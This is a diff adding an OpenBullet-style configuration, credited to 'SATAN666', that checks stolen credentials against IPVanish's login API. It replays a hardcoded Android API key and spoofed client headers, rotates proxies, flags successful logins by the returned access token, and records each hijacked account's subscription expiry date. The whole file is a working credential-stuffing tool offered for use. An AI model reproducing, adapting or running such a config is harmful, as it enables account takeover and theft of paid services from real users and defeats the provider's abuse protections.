@@ -1,0 +1,53 @@
+[SETTINGS]
+{
+  "Name": "IPVanish",
+  "SuggestedBots": 1,
+  "MaxCPM": 0,
+  "LastModified": "2019-07-06T01:36:20.9075664+05:30",
+  "AdditionalInfo": "",
+  "Author": "SATAN666",
+  "Version": "1.1.3",
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "BanProxyAfterGoodStatus": false,
+  "EncodeData": false,
+  "AllowedWordlist1": "",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+REQUEST POST "https://account.ipvanish.com/api/v3/login" 
+  CONTENT "{\"api_key\":\"15cb936e6d19cd7db1d6f94b96017541\",\"client\":\"Android-3.4.1.46735b46735\",\"os\":\"22\",\"password\":\"<PASS>\",\"username\":\"<USER>\",\"uuid\":\"8e2af43c-586c-4428-aadb-33363a96ace6\"}" 
+  CONTENTTYPE "application/json" 
+  HEADER "x-client: ipvanish" 
+  HEADER "x-client-version: 1.2." 
+  HEADER "x-platform: Android" 
+  HEADER "x-platform-version: 22" 
+  HEADER "content-type: application/json; charset=utf-8" 
+  HEADER "content-length: 185" 
+  HEADER "accept-encoding: gzip" 
+  HEADER "user-agent: okhttp/3.12.0" 
+
+KEYCHECK 
+  KEYCHAIN Success OR 
+    KEY "access_token" 
+  KEYCHAIN Failure OR 
+    KEY "The username or password provided is incorrect" 
+
+PARSE "<SOURCE>" JSON "sub_end_epoch" -> VAR "sub" 
+
+FUNCTION UnixTimeToDate "<sub>" -> CAP "Expiry Subscription" 
+
